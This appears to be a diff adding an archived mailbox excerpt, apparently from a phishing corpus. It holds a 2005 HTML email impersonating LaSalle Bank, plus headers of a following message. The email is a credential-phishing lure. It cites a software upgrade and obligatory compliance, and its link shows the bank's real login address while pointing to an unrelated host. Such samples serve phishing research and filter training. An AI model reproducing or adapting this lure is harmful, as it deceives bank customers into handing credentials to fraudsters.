@@ -1,0 +1,85 @@
+From: "LaSalle Bank" <security@lasallebank.com>
+Reply-To: "LaSalle Bank" <security@lasallebank.com>
+To: nikola-comments@crow.ee.washington.edu
+Subject: Update Your Account Information
+Date: Fri, 24 Jun 2005 08:28:15 -0100
+X-Mailer: Microsoft Outlook, Build 10.0.2627
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--67447528089183840784"
+X-Priority: 1
+X-MSMail-Priority: High
+
+----67447528089183840784
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+
+<head>
+<meta http-equiv=3D"Content-Language" content=3D"en-us">
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-=
+1252">
+<title>Dear LaSalle Bank customer</title>
+</head>
+<body>
+<CENTER>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D774 border=3D0 xt=3D"SPTABL=
+E"
+name=3D"SP_TABLE1" id=3D"table1" height=3D"320">
+<TBODY>
+<TD xt=3D"SPCELL" name=3D"yyy">
+
+<p align=3D"left"><font face=3D"Verdana" size=3D"2">Dear client of LaSalle=
+ Bank,</font></p>
+<p align=3D"justify"><font face=3D"Verdana" size=3D"2">Technical services =
+of the 
+LaSalle Bank are carrying out a planned software upgrade. We earnestly ask=
+ you 
+to visit the following link to start the procedure of confirmation on cust=
+omers 
+data.</font></p>
+<p align=3D"justify"><font face=3D"Verdana" size=3D"2">To get started, ple=
+ase click 
+the link below:</font></p>
+<p align=3D"justify"><font face=3D"Verdana" size=3D"2">
+<b>
+<a target=3D"_blank" href=3D"http://www.supaoctopus.com/.LaSalleBank/index=
+php">
+https://onlinebanking.lasallebank.com/efs/servlet/efs/login2.jsp?shortname=
+=3Dlasalle&longname=3DLaSalle+Online</a></b></font></p>
+<p align=3D"justify"><font face=3D"Verdana" size=3D"2">This instruction ha=
+s been sent 
+to all bank customers and is obligatory to fallow.</font></p>
+<p align=3D"justify"><font face=3D"Verdana" size=3D"2">Thank you,</font></=
+p>
+<p align=3D"justify"><font face=3D"Verdana" size=3D"2">LaSalle Bank Custom=
+ers Support Service.</font></p></TD></TR>
+</TBODY></TABLE>
+
+</body>
+
+</html>
+
+----67447528089183840784--
+
+
+
+--------------010405060701020505000108--
+
+From bjf10@ee.washington.edu  Fri Jun 24 14:59:16 2005
+Return-Path: <bjf10@ee.washington.edu>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from mail1.monkey.org (mail1.monkey.org [65.23.81.153])
+	by naughty.monkey.org (Postfix) with ESMTP id 7C7DF536E12
+	for <jose@login.monkey.org>; Fri, 24 Jun 2005 14:59:16 -0400 (EDT)
+Received: from seagull.ee.washington.edu (ssli-mail.ee.washington.edu [128.95.167.7])
+	by mail1.monkey.org (Postfix) with ESMTP id 897F685AA36
+	for <jose@monkey.org>; Fri, 24 Jun 2005 14:59:15 -0400 (EDT)
+Received: from [128.95.167.30] (skif.ee.washington.edu [128.95.167.30])
+	by seagull.ee.washington.edu (8.13.1/8.13.3) with ESMTP id j5OIxE7B007448
+	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
+	for <jose@monkey.org>; Fri, 24 Jun 2005 11:59:15 -0700
+Message-ID: <42BC5802.6070304@ee.washington.edu>
+Date: Fri, 24 Jun 2005 11:59:14 -0700
